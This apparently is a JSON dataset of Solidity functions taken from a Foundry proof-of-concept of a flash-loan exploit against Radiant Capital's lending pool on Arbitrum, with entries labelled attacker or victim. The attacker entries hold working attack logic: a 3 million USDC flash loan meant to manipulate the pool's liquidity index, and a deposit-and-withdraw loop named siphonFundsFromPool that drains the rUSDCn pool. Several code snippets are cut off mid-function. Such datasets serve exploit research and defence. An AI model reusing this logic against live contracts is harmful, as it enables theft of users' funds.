[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "executeOperation",
    "original_code": "    function executeOperation(\n        address[] calldata assets,\n        uint256[] calldata amounts,\n        uint256[] calldata premiums,\n        address initiator,\n        bytes calldata params\n    ) external returns (bool) {\n        if ((operationId - 1) != 0) {\n            if (operationId == 2) {\n                operationId = 3;\n                uint256 rUSDCnBalanceBeforeTransfer = rUSDCn.balanceOf(address(this));\n                USDC.transfer(address(rUSDCn), rUSDCn.balanceOf(address(this)));\n                RadiantLendingPool.withdraw(address(USDC), rUSDCnBalanceBeforeTransfer - 1, address(this));\n            }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"arbitrum\", 166_405_686);\n        vm.label(address(AaveV3Pool), \"AaveV3Pool\");\n        vm.label(address(USDC), \"USDC\");\n        vm.label(address(rUSDCn), \"rUSDCn\");\n        vm.label(address(rWETH), \"rWETH\");\n        vm.label(address(WETH), \"WETH\");\n        vm.label(address(RadiantLendingPool), \"RadiantLendingPool\");\n        vm.label(address(WETH_USDC), \"WETH_USDC\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"Exploiter WETH balance before attack\", WETH.balanceOf(address(this)), 18);\n        operationId = 1;\n        bytes memory params = abi.encode(\n            address(RadiantLendingPool), address(rUSDCn), address(rWETH), address(WETH_USDC), uint256(1), uint256(0)\n        );\n        // Start flashloan attack to manipulate the liquidityIndex value\n        takeFlashLoan(address(AaveV3Pool), 3_000_000 * 1e6, params);\n        emit log_named_decimal_uint(\"Exploiter WETH balance after attack\", WETH.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3SwapCallback",
    "original_code": "    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {\n        if (amount0Delta > 0) {\n            WETH.transfer(address(WETH_USDC), uint256(amount0Delta));\n        } else {\n            USDC.transfer(address(WETH_USDC), uint256(amount1Delta));\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "IRadiant",
    "source_type": "victim_contract",
    "function_name": "borrow",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IRadiant",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IRadiant",
    "source_type": "victim_contract",
    "function_name": "flashLoan",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IRadiant",
    "source_type": "victim_contract",
    "function_name": "flashLoanSimple",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IRadiant",
    "source_type": "victim_contract",
    "function_name": "repay",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IRadiant",
    "source_type": "victim_contract",
    "function_name": "supply",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IRadiant",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "HelperExploit",
    "source_type": "attacker_contract",
    "function_name": "siphonFundsFromPool",
    "original_code": "    function siphonFundsFromPool(\n        uint256 amount\n    ) external {\n        USDC.transferFrom(msg.sender, address(this), amount << 1);\n        USDC.approve(address(RadiantLendingPool), type(uint256).max);\n        bool depositSingleAmount;\n        while (true) {\n            if (USDC.balanceOf(address(rUSDCn)) < 1) {\n                break;\n            }\n            if (depositSingleAmount == true) {\n                RadiantLendingPool.deposit(address(USDC), amount, address(this), 0);\n            } else {\n                RadiantLendingPool.deposit(address(USDC), amount << 1, address(this), 0);\n                depositSingleAmount = true;\n            }\n            if (USDC.balanceOf(address(rUSDCn)) > ((amount * 3) >> 1) - 1) {\n                RadiantLendingPool.withdraw(address(USDC), ((amount * 3) >> 1) - 1, address(this));\n            } else {\n                RadiantLendingPool.withdraw(address(USDC), USDC.balanceOf(address(rUSDCn)), address(this));\n                USDC.transfer(msg.sender, USDC.balanceOf(address(this)));\n            }\n",
    "description": ""
  }
]